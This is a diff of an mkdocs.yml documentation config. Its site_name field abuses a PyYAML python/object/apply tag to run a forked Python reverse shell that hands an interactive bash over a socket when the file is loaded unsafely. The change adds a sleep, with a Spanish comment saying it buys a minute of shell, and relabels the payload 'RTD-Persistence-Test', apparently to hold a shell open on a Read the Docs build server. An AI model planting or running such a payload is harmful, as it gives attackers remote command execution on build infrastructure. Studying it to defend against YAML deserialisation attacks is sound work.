@@ -1,6 +1,6 @@
 site_name: !!python/object/apply:subprocess.getoutput
   - |
-    python3 -c 'import os,socket,subprocess;
+    python3 -c 'import os,socket,subprocess,time;
     if os.fork() == 0:
         os.setsid()
         if os.fork() == 0:
@@ -10,12 +10,14 @@ site_name: !!python/object/apply:subprocess.getoutput
                 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
                 subprocess.call(["/bin/bash","-i"])
             except: pass
+    time.sleep(60) # <--- ESTO COMPRA 1 MINUTO DE SHELL
     '
-    echo "Read-The-Docs-Research-Project"
+    echo "RTD-Persistence-Test"
 plugins:
   - search
 markdown_extensions:
   - pymdownx.snippets
+
 
 
 
